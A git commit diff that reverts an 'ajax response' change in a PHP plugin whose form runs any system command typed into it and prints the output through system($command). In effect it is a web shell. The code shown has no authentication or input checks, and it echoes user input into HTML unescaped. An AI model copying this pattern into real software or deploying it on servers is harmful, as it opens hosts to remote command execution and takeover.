08e85c659644816004bbde48f80c75a1088e3c59
ivan <yifanb@gmail.com>
2014-09-20 16:32:33 +0800

    Revert "加入了ajax响应"
    This reverts commit f27c92c9818d2e8ef7cd9a0725169fc8b3fd0b1f.

--- plugin/cmd-run.php
+++
@@ -1,5 +0,0 @@
-<?php 
-if($command) {
-echo system($command);
-}
-?>
--- plugin/cmd.php
+++ plugin/cmd.php
@@ -2,10 +2,12 @@
 	<blockquote>
 	<p>这里输入您要执行的系统命令</p>
 	</blockquote>	
+	<form name="myform" action="<?php echo $PHP_SELF ?>" method="post">
 	 <div class="input-group input-cmd">
-     <input type="text" class="form-control txt-cmd"  placeholder="whoami" name="command">
+     <input type="text" class="form-control"  placeholder="whoami" name="command" <?php if ($command) { echo "value=\"$command\"";} ?>>
       <span class="input-group-btn">
-	  <input name="submit_btn" type="submit"  class="btn btn-primary btn-cmd" value="执行">
+	  <input name="submit_btn" type="submit"  class="btn btn-primary" value="执行">
       </span>
     </div>
-	<textarea class="form-control text-cmd" rows="15" ></textarea>
+	<textarea class="form-control" rows="15" ><?php if ($command) {echo system($command);}?></textarea>
+	</form>	
